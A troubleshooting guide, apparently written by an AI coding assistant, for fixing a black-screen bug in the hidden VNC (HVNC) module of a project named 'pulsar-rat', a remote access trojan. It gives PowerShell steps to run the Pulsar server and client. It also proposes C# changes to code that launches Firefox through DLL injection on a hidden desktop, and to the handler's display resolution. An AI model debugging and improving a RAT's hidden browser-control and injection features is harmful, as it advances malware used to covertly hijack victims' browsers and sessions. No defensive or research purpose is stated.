# HVNC Black Screen Diagnostic - Test Chrome vs Firefox

**Purpose:** Determine if the issue is HVNC desktop display or Firefox-specific

---

## 🧪 Test Plan

### Step 1: Restart Everything Clean
```powershell
# Kill all processes
Get-Process Pulsar, Client, firefox, chrome -ErrorAction SilentlyContinue | Stop-Process -Force

Start-Sleep -Seconds 3

# Start fresh Pulsar
cd C:\Users\chris\projects\development\pulsar-rat\TEST_DEPLOYMENT\Server
.\Pulsar.exe

Start-Sleep -Seconds 5

# Start Client
cd ..\Client
.\Client.exe

Start-Sleep -Seconds 2
```

### Step 2: Create HVNC Desktop Session
1. In Client GUI, right-click connected client
2. Select "HVNC Desktop"
3. Wait for viewer window to open
4. You should see a black desktop (this is normal - waiting for content)

### Step 3: Try CHROME First
1. In HVNC viewer, right-click desktop
2. Select "Launch Browser" → "Chrome"
3. Wait 15-20 seconds
4. **Question:** Do you see Chrome appear in the viewer?

### Step 4: Depending on Chrome Result

**IF CHROME WORKS:**
- HVNC desktop is working correctly ✅
- Issue is Firefox-specific
- See: Firefox-Specific Fixes (below)

**IF CHROME SHOWS BLACK SCREEN:**
- HVNC desktop has display issue
- Both browsers affected
- See: HVNC Display Issue (below)

**IF CHROME DOESN'T LAUNCH:**
- Connection or permissions issue
- See: Troubleshooting (below)

---

## 🔧 If CHROME Works (Firefox is the problem)

### Firefox might be:
1. Crashing on startup
2. Not initializing graphics properly
3. Window not being created

### Try this:

**Add Firefox console/error output:**

Edit: `Pulsar.Client/Helper/HVNC/ProcessController.cs` Line 130

Change from:
```csharp
public async Task StartFirefoxAsync(byte[] dllbytes)
{
    // ... existing code ...
    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, firefoxConfig.ExecutablePath, ...)).ConfigureAwait(false);
}
```

To:
```csharp
public async Task StartFirefoxAsync(byte[] dllbytes)
{
    // ... existing code ...
    
    // Launch Firefox directly first to test
    var psi = new ProcessStartInfo
    {
        FileName = firefoxConfig.ExecutablePath,
        Arguments = "-new-instance -ProfileManager",
        CreateNoWindow = false,
        UseShellExecute = false
    };
    
    using (var process = System.Diagnostics.Process.Start(psi))
    {
        await Task.Delay(5000); // Wait for it to start
        // Don't wait for exit - return immediately
    }
}
```

Then rebuild and test. This will launch Firefox directly instead of via DLL injection to see if that works.

---

## 🔧 If Both Show Black Screen (HVNC Display Issue)

The HVNC desktop itself may have a display problem:

### Possible causes:
1. Desktop resolution is 0x0 or invalid
2. Display driver doesn't support hidden desktop
3. Screen capture isn't working
4. Graphics driver compatibility

### Try this:

**Check desktop bounds:**

Add logging to HVNCHandler.cs around line 125-130:

```csharp
var monitorBounds = Screen.AllScreens[displayIndex].Bounds;
Debug.WriteLine($"HVNC Desktop - Display {displayIndex}: {monitorBounds.Width}x{monitorBounds.Height}");

var resolution = new Resolution 
{ 
    Height = monitorBounds.Height, 
    Width = monitorBounds.Width 
};

Debug.WriteLine($"Creating stream codec with resolution: {resolution.Width}x{resolution.Height}");
```

Then check debug output to see what resolution is being used.

**Force smaller resolution:**

If resolution is very large (> 2560x1440), try forcing smaller:

```csharp
var resolution = new Resolution 
{ 
    Height = Math.Min(1080, monitorBounds.Height), 
    Width = Math.Min(1920, monitorBounds.Width) 
};
```

---

## ⚡ Quick Diagnostic Output

Create this debug script:

```powershell
# Log what happens when launching Firefox
$DebugPreference = "Continue"

# Trigger Firefox launch via HVNC Client API
# Then check output
```

---

## 📋 Expected Results

| Browser | HVNC Works | Firefox Works | Action |
|---------|-----------|---------------|--------|
| Chrome displays properly | ✅ | Try step 3 | If Firefox black → see Firefox Fix |
| Chrome shows black too | ✅ Issue: Display | Firefox same issue | See HVNC Fix |
| Chrome won't launch | ❌ Connection | - | Check network/permissions |

---

## 🎯 Next Steps

1. **Test Chrome NOW** - takes 2 minutes
2. Report result: "Chrome worked / black screen / won't launch"
3. I'll provide specific fix based on result

---

Generated: November 20, 2026
